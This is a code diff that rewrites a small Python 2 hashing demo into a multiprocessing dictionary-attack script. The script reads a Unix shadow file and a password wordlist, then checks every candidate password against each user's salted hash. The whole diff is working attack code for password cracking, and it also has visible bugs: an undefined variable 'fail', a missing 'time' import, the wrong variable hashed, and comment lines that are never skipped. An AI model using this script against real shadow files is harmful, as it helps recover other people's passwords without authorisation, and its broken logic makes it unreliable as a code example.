@@ -1,13 +1,65 @@
 '''
-This is a naive dictionary attack script based on a sample of '''
+This is a naive dictionary attack script with a bit of multiprocessing for fun 
+Linux only
+'''
+
+
 import sys
 import crypt
+import multiprocessing as mp
 
-if len(sys.argv) != 3:
-    print "Usage: {} password salt".format(sys.argv[0])
-else:
-    password = sys.argv[1]
-    salt = sys.argv[2]
+def multi_run_wrapper(args):
+   return deCript(*args)
 
-    e_pass = crypt.crypt(password, salt)
-    print "Password: {} Salt: {} Hash: {}".format(password, salt, e_pass)
+def start_process():
+    print 'Starting', mp.current_process().name
+
+def  deCript(user, ctype, salt, Ppassword, rhash):
+	if (ctype == '0'):
+		insalt = salt
+	else:
+		insalt = '${}${}$'.format(ctype, salt)
+	chash = crypt.crypt(password, insalt)
+	if (rhash == chash):
+		return user, Ppassword
+
+	else:
+		return fail
+if __name__ == "__main__":
+	passwordfile = open("password", 'r')
+	userfile = open("shadow", 'r')
+	passwords = []
+	for line in passwordfile:
+		if (line[0] == '#' or line[0] == '\n'):
+			pass
+		line = line.rstrip('\n')
+		passwords.append(line)
+
+	users = []
+	ctypes = []
+	salts = []
+	rhashes = []
+
+	for line in userfile:
+		line = line.rstrip('\n')
+		line = line.split(":")
+		hashpass = line[1].split('$')
+		users.append(line[0])
+		rhashes.append(line[1])
+		if (len(hashpass) > 1):
+			ctypes.append(hashpass[1])
+			salts.append(hashpass[2])
+		else:
+			ctypes.append('0')
+			salts.append(line[1][0:2])
+
+	tasks = []
+	for i in range(len(users)):
+		for j in range(len(passwords)):
+			tasks.append((users[i], ctypes[i], salts[i], passwords[j], rhashes[i]))
+	
+	pool_size = mp.cpu_count()*2
+
+	pool = mp.Pool(processes=pool_size, initializer=start_process, maxtasksperchild=2, )
+	time.sleep(1)
+	results = pool.map(multi_run_wrapper,tasks)
